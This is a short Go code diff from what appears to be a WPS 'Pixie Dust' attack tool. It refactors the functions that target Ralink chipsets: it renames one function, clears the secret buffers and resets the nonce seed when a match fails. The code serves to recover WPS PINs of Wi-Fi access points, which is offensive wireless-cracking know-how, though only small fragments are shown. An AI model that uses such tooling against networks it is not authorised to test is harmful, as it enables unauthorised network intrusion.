@@ -22,7 +22,10 @@ import "fmt"
 
 
 func (pda *pixieDustAttack) ralinkRTSpecialCase() {
-    pda.crackFirstHalf([]byte{})
+    clear(pda.eSecret1)
+    clear(pda.eSecret2)
+    
+    pda.crackFirstHalf(nil)
     pda.crackSecondHalf()
     
     if !pda.pinFound() {
@@ -71,7 +74,7 @@ func ralinkRandStateRestore(sreg uint32, r byte) uint32 {
 
 
 
-func (pda *pixieDustAttack) ralinkFull() {
+func (pda *pixieDustAttack) attackRalink() {
 	if !pda.auto {
 		pda.ralinkRTSpecialCase()
 	}
@@ -84,7 +87,7 @@ func (pda *pixieDustAttack) ralinkFull() {
     }
 
 	pda.calculateSeeds()
-	pda.crackFirstHalf([]byte{})
+	pda.crackFirstHalf(nil)
 	pda.crackSecondHalf()
 
 	if !pda.pinFound() {
@@ -105,6 +108,7 @@ func (pda *pixieDustAttack) checkIfMatch() bool {
 
     for j := range wpsNonceLen {
         if ralinkRandByte(&sreg) != pda.eNonce[j] {
+            pda.nonceSeed = 0
             return false
         }
     }
